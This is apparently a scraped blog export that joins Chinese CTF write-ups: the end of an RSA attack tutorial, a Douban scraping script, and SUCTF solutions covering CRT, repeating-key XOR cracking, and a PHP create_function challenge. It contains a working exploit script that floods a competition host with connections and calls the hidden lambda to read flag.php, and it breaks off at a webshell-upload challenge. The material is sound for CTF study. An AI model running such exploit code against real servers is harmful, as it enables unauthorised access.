0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db c = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0 c_of_2 = pow(2, e, n) m = main() # m = 560856645743734814774953158390773525781916094468093308691660509501812349 print libnum.n2s(m) # QCTF{RSA_parity_oracle_is_fun} 选择密文攻击 适用情况：可以构造任意密文并获得对应明文。\n这个好理解，在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，选取x以满足gcd(x,n)==1 从而使x模n的逆存在，构造密文 c'=c*(x^e) 使解密后明文为 m'=(m*x)%n ，则m=m'*x^-1(mod n) 。可参看模意义下的运算法则部分 。\n广播攻击 适用情况：模数n、密文c不同，明文m、加密指数e相同。一般会是e=k，然后给k组数据\n使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个(m^e) ==ci (mod ni)，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况。按照本文的中国剩余定理小节容易求得m^e的值，当e较小时直接开e方即可，可使用gmpy2.iroot(M,e) 方法。\nPython实现：参见本文 中国剩余定理小节。\n例子：2018强网杯nextrsa-Level9 1 2 3 4 5 6 7 8 9 m = random.randint(0x100000000000, 0xffffffffffff) e = 3 n1 = 0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555L n2 = 0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867L n3 = 0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303L c1 = pow(m, e, n1) c2 = pow(m, e, n2) c3 = pow(m, e, n3) print m == gmpy2.iroot(CRT([n1, n2, n3], [c1, c2, c3]), e)[0] 其他例题 【Jarvis OJ Medium RSA】解析公钥文件 使用命令从PEM文件（Privacy-Enhanced Mail 是用于存储和发送密钥、证书等数据的文件格式）中解析公钥对(n,e)，n可在线查询 (http://factordb.com/) 到质因子，分解n得到p和q，便能够计算欧拉函数值及解密指数，从而解密。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 C:\\Users\\neo\\Downloads\\mediumRSA.rar λ openssl rsa -pubin -text -modulus -in pubkey.pem WARNING: can\u0026#39;t open config file: /usr/local/ssl/openssl.cnf Public-Key: (256 bit) Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 65537 (0x10001) Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr yigb/+l/vjDdAgMBAAE= -----END PUBLIC KEY----- carck.py\n1 2 3 4 5 6 7 8 9 10 11 import gmpy2,binascii n=87924348264132406875276140514499937145050893665602592992418171647042491658461 e=0x10001 # via http://factordb.com/ p=275127860351348928173285174381581152299 q=319576316814478949870590164193048041239 d=gmpy2.invert(e,(p-1)*(q-1)) c=int(open(\u0026#39;flag.enc\u0026#39;,\u0026#39;rb\u0026#39;).read().encode(\u0026#39;hex\u0026#39;),16) m=hex(pow(c,d,n))[2:] print binascii.unhexlify(m.zfill(len(m)+8-len(m)%8)) 后话 RSA可谓现代密码学的中流砥柱，关于它的可行攻击方法研究还有很多，诸如Timing Attack ，Padding oracle attack，Side-channel analysis attacks等类型的攻击，本文仅介绍了一些通俗易懂的方法，读者还可以阅读 CTF wiki中的非对称加密部分 ，以及以 RSA (cryptosystem) 为目录结合谷歌进行进一步学习。\n本文的例题附件、代码段、工具和后续更新都会放在 RSA-ATTACK ，欢迎 star \u0026amp; watch 。\n参考链接 Practical Padding Oracle Attacks on RSA\nCTF wiki中的非对称加密部分\n","permalink":"https://ret2neo.cn/post/180727rsa-attack/","summary":"本文首发先知社区 ，转载请注明链接。\nCTF中常见的RSA相关问题总结 前言 ​理解基本概念后，代码就可以说明一切，所以本文将每种攻击方式的实现方法都提炼成了一个函数，在理解原理时会有帮助，在需要时也可以直接调用。\n基础 RSA概要 在开始前可以通过 《RSA算法详解》 这篇文章了解关于RSA的基础知识，包括加解密方法，算法原理和可行性证明等。\n应用流程 选取两个较大的互不相等的质数p和q，计算n = p * q 。 计算phi = (p-1) * (q-1) 。 选取任意e，使得e满足 1\u0026lt;e\u0026lt;phi 且 gcd(e , phi) == 1 。 计算e关于 phi 的模逆元d， 即d满足(e * d)% phi ==1 。 加解密：c = (m ^ e) % n ， m = (c ^ d) % n 。其中m为明文，c为密文，(n,e)为公钥对，d为私钥，要求 0 \u0026lt;= m \u0026lt; n 。 理解模逆运算 如果 (a*b)%c==1 ，那么a和b互为对方模c的模逆元/数论倒数，也写作 。\n关于最大公约数有一个基本事实：给予两整数a、c，必存在整数x、y使得ax + cy = gcd(a,c) ，基于这个事实，当a,c互素即gcd(a,c)==1 时，有ax+cy=1 ，那么就有(a*x)%c==1 ，所以x就是a 对c的模逆元。因此，a对c存在模逆元b的充要条件是gcd(a,c)==1 。显然对于每一组a,c ，存在一族满足条件的x，在求模逆元时我们取得是最小正整数解x mod n 。","title":"CTF中常见的RSA相关问题总结"},{"content":"效果见 findneo 的观影记录 。 环境依赖：python2 + pip install bs4 lxml requests\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 #coding:utf8 # https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/ # http://docs.python-requests.org/zh_CN/latest/user/quickstart.html from bs4 import BeautifulSoup import requests import base64 # 配置用户ID，可登陆后查看地址栏获取 username=\u0026#34;findneo\u0026#34; # 配置cookies，有些记录可能设置为仅自己可见，那么就需要登陆来获取完整记录 # cookie中只要有dbc12就可以表明身份 cookies=dict() # cookies=dict(dbcl2=\u0026#34;xxxxxxxxxxxxxxxxxxx\u0026#34;) def parse(url): r=requests.get(url,cookies=cookies) s=BeautifulSoup(r.content,\u0026#39;lxml\u0026#39;) one_page=s.find_all(name=\u0026#39;a\u0026#39;,attrs={\u0026#39;class\u0026#39;:\u0026#39;nbg\u0026#39;}) return one_page def main(): url=\u0026#34;https://movie.douban.com/people/%s/collect\u0026#34;%username page_url=\u0026#34;https://movie.douban.com/people/findneo/collect?start=%d\u0026#34; r=requests.get(url,cookies=cookies) movie_num=int(BeautifulSoup(r.content,\u0026#39;lxml\u0026#39;).title.string[12:-2]) each_page=15 page_num=movie_num/each_page+(movie_num%each_page!=0) # page_num=1 f=open(\u0026#39;movie.html\u0026#39;,\u0026#39;w+\u0026#39;) content=[] for i in xrange(page_num): purl=page_url%(each_page*i) content+=parse(purl) html=\u0026#34;\u0026#34;\u0026#34; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;/\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;img{ width: 10%%; height: 33.3%%; display: block; float: left;}\u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;title\u0026gt; %s\u0026#39;s movie(%d)\u0026lt;/title\u0026gt;\\n%s \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34;%(username,movie_num,\u0026#39;\\n\u0026#39;.join(map(str,content))) \u0026#34;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026lt;title\u0026gt;douban\u0026lt;/title\u0026gt;%s\u0026#34; f.write(html) def img2base64(infile,outfile): inf=open(infile) s=BeautifulSoup(inf,\u0026#39;lxml\u0026#39;) for i in s.find_all(\u0026#39;img\u0026#39;): i[\u0026#39;src\u0026#39;]=\u0026#34;data:image/jpeg;base64,%s\u0026#34;%base64.b64encode(requests.get(i[\u0026#39;src\u0026#39;]).content) open(outfile,\u0026#39;w+\u0026#39;).write(str(s)) if __name__ == \u0026#39;__main__\u0026#39;: # 在当前目录下生成res.html main() # 将所有图片下载并用base64编码存储，加载时就无需从豆瓣再获取图片。 img2base64(\u0026#39;movie.html\u0026#39;,\u0026#39;movie2.html\u0026#39;) 20210802update 现在需要指定UA才能读取到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 #coding:utf8 # https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/ # http://docs.python-requests.org/zh_CN/latest/user/quickstart.html from bs4 import BeautifulSoup import requests import base64,re # 配置用户ID，可登陆后查看地址栏获取 username=\u0026#34;findneo\u0026#34; # 配置cookies，有些记录可能设置为仅自己可见，那么就需要登陆来获取完整记录 # cookie中只要有dbc12就可以表明身份 cookies=dict() # cookies=dict(dbcl2=\u0026#34;xxxxxxxxxxxxxxxxxxx\u0026#34;) def parse(url): r=requests.get(url,cookies=cookies,headers={\u0026#34;User-Agent\u0026#34;:\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36\u0026#34;});#print(url) s=BeautifulSoup(r.content,\u0026#39;lxml\u0026#39;) one_page=s.find_all(name=\u0026#39;a\u0026#39;,attrs={\u0026#39;class\u0026#39;:\u0026#39;nbg\u0026#39;});print(url) return one_page def main(): url=\u0026#34;https://movie.douban.com/people/%s/collect\u0026#34;%username page_url=\u0026#34;https://movie.douban.com/people/findneo/collect?start=%d\u0026#34; headers={\u0026#34;User-Agent\u0026#34;:\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36\u0026#34;} r=requests.get(url,cookies=cookies,headers=headers) #;print(r.content) print(BeautifulSoup(r.content,\u0026#39;lxml\u0026#39;).title) movie_num=int(re.findall(\u0026#34;\\d+\u0026#34;,BeautifulSoup(r.content,\u0026#39;lxml\u0026#39;).title.string)[0]);print(movie_num) each_page=15 page_num=movie_num/each_page+(movie_num%each_page!=0) # page_num=1 f=open(\u0026#39;movie.html\u0026#39;,\u0026#39;w+\u0026#39;) content=[] for i in xrange(page_num): purl=page_url%(each_page*i) content+=parse(purl) html=\u0026#34;\u0026#34;\u0026#34; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;/\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;img{ width: 10%%; height: 33.3%%; display: block; float: left;}\u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;title\u0026gt; %s\u0026#39;s movie(%d)\u0026lt;/title\u0026gt;\\n%s \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34;%(username,movie_num,\u0026#39;\\n\u0026#39;.join(map(str,content))) \u0026#34;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026lt;title\u0026gt;douban\u0026lt;/title\u0026gt;%s\u0026#34; f.write(html) def img2base64(infile,outfile): inf=open(infile) s=BeautifulSoup(inf,\u0026#39;lxml\u0026#39;) for i in s.find_all(\u0026#39;img\u0026#39;): i[\u0026#39;src\u0026#39;]=\u0026#34;data:image/jpeg;base64,%s\u0026#34;%base64.b64encode(requests.get(i[\u0026#39;src\u0026#39;]).content) open(outfile,\u0026#39;w+\u0026#39;).write(str(s)) if __name__ == \u0026#39;__main__\u0026#39;: # 在当前目录下生成res.html main() # 将所有图片下载并用base64编码存储，加载时就无需从豆瓣再获取图片。 img2base64(\u0026#39;movie.html\u0026#39;,\u0026#39;movie2.html\u0026#39;) ","permalink":"https://ret2neo.cn/post/180706doubanmovie/","summary":"效果见 findneo 的观影记录 。 环境依赖：python2 + pip install bs4 lxml requests\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 #coding:utf8 # https://www.","title":"根据豆瓣观影记录生成海报"},{"content":"MISC sandgame game.py\n1 2 3 4 5 6 7 8 import flag flag = flag.flag sands = int(flag[5:-1].encode(\u0026#34;hex\u0026#34;), 16) holes = [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373] with open(\u0026#34;sand.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: for i in range(len(holes)): sand = sands % holes[i] f.write(str(sand)+\u0026#34;\\n\u0026#34;) solution.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #coding:utf8 # import flag # 解同余方程组；中国剩余定理，韩信点兵，扩展欧几里得，模反 \u0026lt;= 深入理解 #求模反元素，模逆元 def gcd(a,b): while a!=0: a,b = b%a,a return b #定义一个函数，参数分别为a,n，返回值为b def findModReverse(a,m):#这个扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m holes = [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373] sand = [222, 203, 33, 135, 203, 62, 227, 82, 239, 82, 11, 220, 74, 92, 8, 308, 195, 165, 87, 4] M=1 for i in holes: M*=i s=0 for i,j in enumerate(holes): mi=j Mi=M/mi s=s+findModReverse(Mi,mi)*sand[i]*Mi print str(hex(s%M)[2:-1]).decode(\u0026#39;hex\u0026#39;) # This_is_the_CRT_xwg) 韩信点兵问题，根据中国剩余定理构造通解\nCycle cycle.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import flag def encryt(key, plain): cipher = \u0026#34;\u0026#34; for i in range(len(plain)): cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i])) return cipher def getPlainText(): plain = \u0026#34;\u0026#34; with open(\u0026#34;plain.txt\u0026#34;) as f: while True: line = f.readline() if line: plain += line else: break return plain def main(): key = flag.flag assert key.startswith(\u0026#34;flag{\u0026#34;) assert key.endswith(\u0026#34;}\u0026#34;) key = key[5:-1] assert len(key) \u0026gt; 1 assert len(key) \u0026lt; 50 assert flag.languageOfPlain == \u0026#34;English\u0026#34; plain = getPlainText() cipher = encryt(key, plain) with open(\u0026#34;cipher.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(cipher.encode(\u0026#34;base_64\u0026#34;)) if __name__ == \u0026#34;__main__\u0026#34;: main() cipher.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 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 类似维吉尼亚的变种，key长度远小于plain，循环异或后可统计字频，南邮CTF平台有一题相似的。详见 https://findneo.github.io/171005NuptVigenereWP/ 。稍微更改其中读取密文部分即可。flag{Something Just Like This} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 # coding:utf8 # by https://findneo.github.io/ def getCipher(file=\u0026#39;code.txt\u0026#39;): \u0026#39;\u0026#39;\u0026#39;从文件中读取十六进制串，返回十六进制数组 \u0026#39;\u0026#39;\u0026#39; c=\u0026#39;\u0026#39;.join(map(lambda x:x.strip(),open(\u0026#39;cipher.txt\u0026#39;).readlines())).decode(\u0026#39;base_64\u0026#39;) cc= [ord(i) for i in c] # print cc,len(cc) return cc # c = open(file).read() # codeintlist = [] # codeintlist.extend( # (map(lambda i: int(c[i:i + 2], 16), range(0, len(c), 2)))) # return codeintlist def getKeyPool(cipher, stepSet, plainSet, keySet): \u0026#39;\u0026#39;\u0026#39; 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33] 返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。 形如{ 1:[[0x11]], 3:[ [0x11,0x33,0x46], [0x22,0x58], [0x33] ] } \u0026#39;\u0026#39;\u0026#39; keyPool = dict() for step in stepSet: maybe = [None] * step for pos in xrange(step): maybe[pos] = [] for k in keySet: flag = 1 for c in cipher[pos::step]: if c ^ k not in plainSet: flag = 0 if flag: maybe[pos].append(k) for posPool in maybe: if len(posPool) == 0: maybe = [] break if len(maybe) != 0: keyPool[step] = maybe return keyPool def calCorrelation(cpool): \u0026#39;\u0026#39;\u0026#39;传入字典，形如{\u0026#39;e\u0026#39;:2,\u0026#39;p\u0026#39;:3} 返回可能性，0~1,值越大可能性越大 (correlation between the decrypted column letter frequencies and the relative letter frequencies for normal English text) \u0026#39;\u0026#39;\u0026#39; frequencies = {\u0026#34;e\u0026#34;: 0.12702, \u0026#34;t\u0026#34;: 0.09056, \u0026#34;a\u0026#34;: 0.08167, \u0026#34;o\u0026#34;: 0.07507, \u0026#34;i\u0026#34;: 0.06966, \u0026#34;n\u0026#34;: 0.06749, \u0026#34;s\u0026#34;: 0.06327, \u0026#34;h\u0026#34;: 0.06094, \u0026#34;r\u0026#34;: 0.05987, \u0026#34;d\u0026#34;: 0.04253, \u0026#34;l\u0026#34;: 0.04025, \u0026#34;c\u0026#34;: 0.02782, \u0026#34;u\u0026#34;: 0.02758, \u0026#34;m\u0026#34;: 0.02406, \u0026#34;w\u0026#34;: 0.02360, \u0026#34;f\u0026#34;: 0.02228, \u0026#34;g\u0026#34;: 0.02015, \u0026#34;y\u0026#34;: 0.01974, \u0026#34;p\u0026#34;: 0.01929, \u0026#34;b\u0026#34;: 0.01492, \u0026#34;v\u0026#34;: 0.00978, \u0026#34;k\u0026#34;: 0.00772, \u0026#34;j\u0026#34;: 0.00153, \u0026#34;x\u0026#34;: 0.00150, \u0026#34;q\u0026#34;: 0.00095, \u0026#34;z\u0026#34;: 0.00074} relative = 0.0 total = 0 fpool = \u0026#39;etaoinshrdlcumwfgypbvkjxqz\u0026#39; total = sum(cpool.values()) # 总和应包括字母和其他可见字符 for i in cpool.keys(): if i in fpool: relative += frequencies[i] * cpool[i] / total return relative def analyseFrequency(cfreq): key = [] for posFreq in cfreq: mostRelative = 0 for keyChr in posFreq.keys(): r = calCorrelation(posFreq[keyChr]) if r \u0026gt; mostRelative: mostRelative = r keychar = keyChr key.append(keychar) return key def getFrequency(cipher, keyPoolList): \u0026#39;\u0026#39;\u0026#39; 传入的密文作为数字列表处理 传入密钥的字符集应为列表，依次包含各字节字符集。 形如[[0x11,0x12],[0x22]] 返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频 形如[{ 0x11:{\u0026#39;a\u0026#39;:2,\u0026#39;b\u0026#39;:3}, 0x12:{\u0026#39;e\u0026#39;:6} }, { 0x22:{\u0026#39;g\u0026#39;:1} }] \u0026#39;\u0026#39;\u0026#39; freqList = [] keyLen = len(keyPoolList) for i in xrange(keyLen): posFreq = dict() for k in keyPoolList[i]: posFreq[k] = dict() for c in cipher[i::keyLen]: p = chr(k ^ c) posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1 freqList.append(posFreq) return freqList def vigenereDecrypt(cipher, key): plain = \u0026#39;\u0026#39; cur = 0 ll = len(key) for c in cipher: plain += chr(c ^ key[cur]) cur = (cur + 1) % ll return plain def main(): ps = [] ks = [] ss = [] ps.extend(xrange(0xff)) ks.extend(xrange(0x20,0x80)) ss.extend(xrange(1, 50)) cipher = getCipher() keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks) for i in keyPool: freq = getFrequency(cipher, keyPool[i]) key = analyseFrequency(freq) print \u0026#39;\u0026#39;.join(map(chr,key)) if __name__ == \u0026#39;__main__\u0026#39;: main() WEB Anonymous 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php $MY = create_function(\u0026#34;\u0026#34;,\u0026#34;die(`cat flag.php`);\u0026#34;); $hash = bin2hex(openssl_random_pseudo_bytes(32)); eval(\u0026#34;function SUCTF_$hash(){\u0026#34; .\u0026#34;global \\$MY;\u0026#34; .\u0026#34;\\$MY();\u0026#34; .\u0026#34;}\u0026#34;); if(isset($_GET[\u0026#39;func_name\u0026#39;])){ $_GET[\u0026#34;func_name\u0026#34;](); die(); } show_source(__FILE__); https://www.jianshu.com/p/19e3ee990cb7\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import requests import socket import time from multiprocessing.dummy import Pool as ThreadPool try: requests.packages.urllib3.disable_warnings() except: pass def run(i): while 1: HOST = \u0026#39;web.suctf.asuri.org\u0026#39; PORT = 81 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.sendall(\u0026#39;GET /index.php HTTP/1.1\\nHost: web.suctf.asuri.org\\nConnection: Keep-Alive\\n\\n\u0026#39;) # s.close() print \u0026#39;ok\u0026#39; time.sleep(0.5) print requests.get(\u0026#39;http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1\u0026#39;).content i = 8 pool = ThreadPool( i ) result = pool.map_async( run, range(i) ).get(0xffff) $flag=\u0026quot;SUCTF{L4GsMqu6gu5knFnCi2Te8SjSucxKfQj6tuPJokoFhTCJjpa6RSfK}\u0026quot;;\nGetshell 要求上传的webshell文件从第6个字符开始都不能在黑名单内。\n1 